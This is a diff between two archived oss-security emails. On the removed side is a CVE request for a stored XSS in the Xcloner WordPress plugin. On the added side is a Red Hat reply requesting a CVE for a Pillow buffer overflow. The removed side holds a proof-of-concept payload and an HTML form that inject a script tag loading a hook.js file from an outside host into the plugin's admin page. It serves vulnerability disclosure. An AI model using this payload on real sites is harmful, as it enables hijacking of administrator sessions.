@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1042" "Wednesday" "27" "July" "2016" "02:35:46" "+0000" "limingxing" "limingxing@360.cn" "<3626D6E697A150459C44C0E5D8D8D00E0DBE8BDF@EX02.corp.qihoo.net>" "42" "[oss-security] CVE request : a stored XSS in Xcloner for wordpress" nil nil nil "7" "2016072702:35:46" "[oss-security] CVE request : a stored XSS in Xcloner for wordpress" (number mark "U       limingxing@3 Jul 27   42/1042  " thread-indent "\"[oss-security] CVE request : a stored XSS in Xcloner for wordpress\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["760" "Monday" "22" "February" "2016" "13:25:33" "+0100" "Stefan Cornelius" "scorneli@redhat.com" "<20160222132533.7c9cf4f7@redhat.com>" "28" "Re: [oss-security] CVE Request -- Buffer overflow in Python-Pillow and PIL" "^Cc:" nil nil "2" "2016022212:25:33" "[oss-security] CVE Request -- Buffer overflow in Python-Pillow and PIL" (number mark "        scorneli@red Feb 22   28/760   " thread-indent "\"Re: [oss-security] CVE Request -- Buffer overflow in Python-Pillow and PIL\"\n") "<009C89DE-A7D7-4E3E-875A-13C4A916676D@soroos.net>" ("<009C89DE-A7D7-4E3E-875A-13C4A916676D@soroos.net>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 30010 invoked by uid 550); 27 Jul 2016 12:19:45 -0000
+Received: (qmail 15629 invoked by uid 550); 22 Feb 2016 12:25:52 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,63 +11,47 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 24059 invoked from network); 27 Jul 2016 02:36:01 -0000
-From: limingxing <limingxing@360.cn>
-To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
-Thread-Topic: CVE request : a stored XSS in Xcloner for wordpress
-Thread-Index: AdHnr3yPMg9GdCCERk2v+k0+QrUMDg==
-Date: Wed, 27 Jul 2016 02:35:46 +0000
-Message-ID: <3626D6E697A150459C44C0E5D8D8D00E0DBE8BDF@EX02.corp.qihoo.net>
-Accept-Language: zh-CN, en-US
-Content-Language: zh-CN
-X-MS-Has-Attach:
-X-MS-TNEF-Correlator:
-x-originating-ip: [10.199.1.156]
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: quoted-printable
+Received: (qmail 15611 invoked from network); 22 Feb 2016 12:25:51 -0000
+Message-ID: <20160222132533.7c9cf4f7@redhat.com>
+In-Reply-To: <009C89DE-A7D7-4E3E-875A-13C4A916676D@soroos.net>
+References: <009C89DE-A7D7-4E3E-875A-13C4A916676D@soroos.net>
 MIME-Version: 1.0
-Subject: [oss-security] CVE request : a stored XSS in Xcloner for wordpress
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+X-Scanned-By: MIMEDefang 2.68 on 10.5.11.23
+Cc: oss-security@lists.openwall.com, cve-assign@mitre.org
+Date: Mon, 22 Feb 2016 13:25:33 +0100
+From: Stefan Cornelius <scorneli@redhat.com>
+Reply-To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] CVE Request -- Buffer overflow in Python-Pillow
+ and PIL
+To: Eric Soroos <eric@soroos.net>
 
-Hi
+On Tue, 2 Feb 2016 18:51:24 +0000
+Eric Soroos <eric@soroos.net> wrote:
 
-     I found a stored XSS in Xcloner for wordpress.  The XSS filter can=20
-be bypass.
+> Hello,=20
+>=20
+> I=E2=80=99d like to request a CVE number for all versions of Python Pillo=
+w <=3D
+> 3.1.0  and PIL =3D=3D 1.1.7 (at the least).=20
+>=20
+> There is a buffer overflow in PcdDecode.c, where the decoder writes
+> assuming 4 bytes per pixel into a 3 byte per pixel wide buffer,
+> allowing writing 768 bytes off the end of the buffer. This overwrites
+> objects in Python's stack, leading to a crash.=20
+>=20
+> This issue and the patch are public:
+> https://github.com/python-pillow/Pillow/pull/1706
+>=20
+> Thanks,=20
+>=20
+> Eric
 
-     Here is the plugin page
-     https://wordpress.org/plugins/xcloner-backup-and-restore/
+Hi,
 
-     PoC
+I don't think this ever got a CVE? Could one please be assigned?
 
-     In the "Corn setting" page(URL is=20
-"http://<target>/wordpress/wp-admin/plugins.php?page=3Dxcloner_show&option=
-=3Dcom_cloner&task=3Dconfig"),=20
-set the "Backup name" (corn_bname) like=20
-"1%22%3E%3Cscript+src%3Dhttp%3A%2F%2F172.16.146.128%3A3000%2Fhook.js+on"
-
-     <html>
-         <form=20
-action=3D"http://<target>/wordpress/wp-admin/plugins.php?page=3Dxcloner_sho=
-w&option=3Dcom_cloner&task=3Dconfig"=20
-method=3D"post">
-             <input type=3D"hidden" name=3D"cron_bname"=20
-value=3D"1%22%3E%3Cscript+src%3Dhttp%3A%2F%2F172.16.146.128%3A3000%2Fhook.j=
-s+on"=20
-/>
-             <input type=3D"submit" name=3D"submit">
-         </form>
-     </html>
-
-
-     Fix way
-     Update to version 3.1.5
-
-     Change
-
-     https://plugins.trac.wordpress.org/changeset/1456784
-
-
-     Could you assign a CVE ID for it?
-
-Chen Ruiqi
-Codesafe Team=
+Thanks and kind regards,
+--=20
+Stefan Cornelius / Red Hat Product Security
